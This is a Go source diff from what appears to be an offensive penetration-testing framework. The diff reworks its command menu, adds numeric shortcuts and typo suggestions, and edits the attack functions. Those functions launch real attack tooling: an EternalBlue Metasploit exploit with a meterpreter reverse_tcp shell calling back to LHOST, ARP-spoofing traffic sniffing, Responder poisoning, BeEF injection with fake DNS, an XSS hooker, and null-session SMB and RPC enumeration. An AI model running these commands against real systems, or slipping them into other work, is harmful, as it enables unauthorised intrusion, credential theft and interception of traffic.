@@ -11,6 +11,7 @@ import(
     "strings"
     "os/exec"
     "bcolors"
+    "strconv"
     "subprocess"
     "scriptures"
 )
@@ -93,8 +94,12 @@ func executeCommand(cmd string) bool {
         {[]string{"v", "version"}, banners.Version},
         {[]string{"s", "sleep"}, utils.Sleep},
         {[]string{"c", "clear", "clear screen", "screen clear"}, utils.ClearScreen},
-        {[]string{"o", "junks", "outputs", "clear junks", "clear outputs"}, utils.ListJunks},
-        {[]string{"logs", "history", "clear logs", "clear history"}, subprocess.LogHistory},
+
+        //History/Junk commands
+        {[]string{"histo", "history", "show history", "log", "logs", "show log", "show logs"}, subprocess.ShowHistory},
+        {[]string{"c junk", "c junks", "c output", "c outputs", "clear junk", "clear junks", "clear output", "clear outputs"}, utils.ClearJunks},
+        {[]string{"c log", "c logs", "c history", "c histories", "clear log", "clear logs", "clear history", "clear histories"}, subprocess.ClearHistory},
+        {[]string{"junk", "junks", "output", "outputs", "show junk", "show junks", "show output", "show outputs", "l junk", "l junks", "l output", "l outputs", "list junk", "list junks", "list output", "list outputs"}, utils.ListJunks},
 
         // Run/exec commands
         {[]string{"? run", "h run", "info run", "help run", "? exec", "h exec", "info exec", "help exec", "? launch", "h launch", "info launch", "help launch", "? exploit", "h exploit", "info exploit", "help exploit", "? execute", "h execute", "info execute", "help execute"}, menus.HelpInfoRun},
@@ -258,40 +263,74 @@ func NetworkPenFunctions(Function string, args ...interface{}) {
         fmt.Printf("\nFUNCTION => %s", Function)
     }
     if Proxy != "" {
-        fmt.Printf("\nPROXIES => %s", Proxy)
-        utils.SetProxy(Proxy)
+        fmt.Printf("PROXIES => %s\n", Proxy)
+        if err := utils.SetProxy(Proxy); err != nil {
+            // Error already printed by SetProxy
+        }
     }
 
-    commands := map[string]func() {
+    // Command mapping with direct function references
+    commands := map[string]func(){
+        "discover": func() { DiscoverIps() },
+        "portscan": func() { NmapPortScan(Rhost) },
+        "vulnscan": func() { NmapVulnScan(Rhost) },
+        "enumscan": func() { SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost) },
+        "smbexpl0": func() { SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport) },
+        "psniffer": func() { PacketSniffer(Mode, Rhost) },
+        "respond4": func() { KillerResponder(Iface, Lhost) },
+        "beefkill": func() { BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway) },
+        "toxssin1": func() { XssHooker(Rhost) },
 
-        "discover":  func() { DiscoverIps() },
-        "portscan":  func() { NmapPortScan(Rhost) },
-        "vulnscan":  func() { NmapVulnScan(Rhost) },
-        "enumscan":  func() { SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost) },
-        "smbexplo":  func() { SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport) },
-        "psniffer":  func() { PacketSniffer(Mode, Rhost) },
-        "responder": func() { KillerResponder(Iface, Lhost) },
-        "beefninja": func() { BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway) },
-        "xsshooker": func() { XssHooker(Rhost) },
-
+        // Numeric shortcuts
+        "1": func() { DiscoverIps() },
+        "2": func() { NmapPortScan(Rhost) },
+        "3": func() { NmapVulnScan(Rhost) },
+        "4": func() { SmbVulnScan(Rhost); EnumNxc(Rhost); Enum4linux(Rhost); SmbMapScan(Rhost) },
+        "5": func() { SmbVulnScan(Rhost); SmbExploit(Rhost, Lhost, Lport) },
+        "6": func() { PacketSniffer(Mode, Rhost) },
+        "7": func() { KillerResponder(Iface, Lhost) },
+        "8": func() { BeefInjector(Spoofer, Mode, Lhost, Rhost, Iface, Passwd, FakeDns, Gateway) },
+        "9": func() { XssHooker(Rhost) },
     }
+
+    // Command list for typo checking
+    textCommands := []string{"discover", "portscan", "vulnscan", "enumscan", "smbexpl0", "psniffer", "respond4", "beefkill", "toxssin1"}
 
     if action, exists := commands[Function]; exists {
         action()
-    } else {
-        fmt.Printf("\n%s[!] %sInvalid Function %s. Use %s'help' %sfor available Functions.\n", bcolors.Yellow, bcolors.Endc, Function, bcolors.Green, bcolors.Endc)
+        return
     }
+
+    // Check if input was a number
+    if num, err := strconv.Atoi(Function); err == nil {
+        fmt.Printf("\n%s[!] %sNumber %d is invalid. Valid numbers are from 1-10.\n", bcolors.Yellow, bcolors.Endc, num)
+        menus.ListInternalFunctions()
+        return
+    }
+
+    // Check for similar commands
+    lowerInput := strings.ToLower(Function)
+    for _, cmd := range textCommands {
+        lowerCmd := strings.ToLower(cmd)
+        if strings.HasPrefix(lowerCmd, lowerInput) || strings.Contains(lowerCmd, lowerInput) || utils.Levenshtein(lowerInput, lowerCmd) <= 2 {
+            fmt.Printf("\n%s[!] %sFunction '%s%s%s' is invalid. Did you mean %s'%s'%s?\n", bcolors.Yellow, bcolors.Endc, bcolors.Bold, Function, bcolors.Endc, bcolors.Green, cmd, bcolors.Endc)
+            return
+        }
+    }
+
+    fmt.Printf("\n%s[!] %sModule '%s' is invalid. Available commands:\n", bcolors.Yellow, bcolors.Endc, Function)
+    menus.ListInternalFunctions()
 }
 
 func IpNeighbour() {
-    fmt.Printf("\n\n%s[>] %sDiscovering connected devices ...\n", bcolors.Green, bcolors.Endc)
+    fmt.Printf("\n%s[>] %sDiscovering connected devices ...\n", bcolors.Green, bcolors.Endc)
     subprocess.Popen(`ip -h -s -d -a -c=auto -t neighbour`)
     return
 }
 
 func DiscoverIps() {
-    fmt.Printf("\n\n%s[>] %sDiscovering connected devices ...\n", bcolors.Green, bcolors.Endc)
-    subprocess.Popen(`bettercap -eval "set net.probe on; set net.recon on; set net.scan on; net.show"`)
+    fmt.Printf("\n%s[>] %sDiscovering connected devices ...\n", bcolors.Green, bcolors.Endc)
+    subprocess.Popen(`bettercap -eval "set $ {bold}(Jesus.is.❤. Type.exit.when.ready) » {reset}; net.recon on; net.probe on; set net.scan on; net.show; active"`)
     return
 }
 
@@ -300,7 +339,7 @@ func NaabuPortScan(Rhost string) {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %sport scan target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
+    fmt.Printf("\n%s[>] %sport scan target: %s...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`naabu -host %s`, Rhost)
     return
 }
@@ -310,7 +349,7 @@ func NmapPortScan(Rhost string) {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %sport scan target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
+    fmt.Printf("\n%s[>] %sport scan target: %s...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`nmap -sV -sC -O -T4 -n -v -p- %s`, Rhost)
     return
 }
@@ -320,7 +359,7 @@ func NmapVulnScan(Rhost string) {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %svuln scan target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
+    fmt.Printf("\n%s[>] %svuln scan target: %s...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`nmap --open -v -T4 -n -sSV -p- --script="vuln and safe" --reason %s`, Rhost)
     return
 }
@@ -330,7 +369,7 @@ func SmbVulnScan(Rhost string) {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %sSMB vuln scan target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
+    fmt.Printf("\n%s[>] %sSMB vuln scan target: %s...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`nmap -sV -v --script "smb-vuln*" -p139,445 %s`, Rhost)
     return
 }
@@ -340,7 +379,7 @@ func Enum4linux(Rhost string) {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %srunning smb recon on target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
+    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`cd /root/.afr3/africana-base/networks/enum4linux-ng; python3 enum4linux-ng.py -A -v %s`, Rhost)
     return
 }
@@ -350,7 +389,7 @@ func EnumNxc(Rhost string) {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %srunning smb recon on target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
+    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`nxc smb %s -u '' -p '' --verbose --groups --local-groups --loggedon-s --rid-brute --sessions --s --shares --pass-pol`, Rhost)
     return
 }
@@ -360,7 +399,7 @@ func SmbMapScan(Rhost string) {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %srunning smb recon on target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
+    fmt.Printf("\n%s[>] %srunning smb recon on target: %s...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`smbmap -u '' -p '' -r --depth 5 -H %s; smbmap --no-banner -u 'guest' -p '' -r --depth 5 -H %s`, Rhost, Rhost)
     return
 }
@@ -370,13 +409,13 @@ func RpcEnumScan(Rhost string) {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %sperforming rpc recon target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
+    fmt.Printf("\n%s[>] %sperforming rpc recon target: %s...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`rpcclient -U "" -N %s`, Rhost)
     return
 }
 
 func XssHooker(Rhost string) {
-    fmt.Printf("\n\n%s[>] %sperforming M.I.B attacks: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
+    fmt.Printf("\n%s[>] %sperforming M.I.B attacks: %s...\n", bcolors.Green, bcolors.Endc, Rhost)
     subprocess.Popen(`cd %s/networks/toxssin/; python3 toxssin.py -u https://%s -c %s -k %s -p %s -v`, ToolsDir, Lhost, CertPath, KeyPath, "443")
     return
 }
@@ -386,7 +425,7 @@ func SmbExploit(Rhost string, Lhost string, Lport string) {
         fmt.Printf("\n%s[!] %sMissing required parameters RHOST. Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
     }
-    fmt.Printf("\n\n%s[>] %sexploiting smb on target: %s ...\n", bcolors.Green, bcolors.Endc, Rhost)
+    fmt.Printf("\n%s[>] %sexploiting smb on target: %s...\n", bcolors.Green, bcolors.Endc, Rhost)
     fmt.Printf("\nRHOST => %s\nLHOST => %s\nLPORT => %s\n\n", Rhost, Lhost, Lport)
     subprocess.Popen(`msfconsole -x 'use exploit/windows/smb/ms17_010_eternalblue; set RHOSTS %s; set RPORT 445; set PAYLOAD windows/x64/meterpreter/reverse_tcp; set LHOST %s; set LPORT %s; set VERBOSE true; exploit -j'`, Rhost, Lhost, Lport)
 }
@@ -403,10 +442,10 @@ func PacketSniffer(Mode string, Rhost string) {
     switch strings.ToLower(Mode) {
     case "single":
         fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
-        subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; ticker on'`, Rhost)
+        subprocess.Popen(`bettercap -caplet /root/.afr3/africana-base/networks/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set arp.spoof.targets %s; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`, Rhost)
     case "all":
         fmt.Printf("\nRHOST => %s\nMODE => %s\n\n", Rhost, Mode)
-        subprocess.Popen(`bettercap -caplet /usr/share/bettercap/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active; ticker on'`)
+        subprocess.Popen(`bettercap -caplet /root/.afr3/africana-base/networks/caplets/http-req-dump/http-req-dump.cap -eval 'set $ {bold}(Jesus.is.❤. Type.exit.when.done) » {reset}; set net.sniff.verbose true; set net.sniff.local true; net.sniff on; active'`)
     default:
         fmt.Printf("\n%s[!] %sInvalid required parameters MODE: %s%s%s Use %s'help' %sfor details.\n", bcolors.BrightRed, bcolors.Endc, bcolors.BrightRed, Mode, bcolors.Endc, bcolors.BrightGreen, bcolors.Endc)
         return
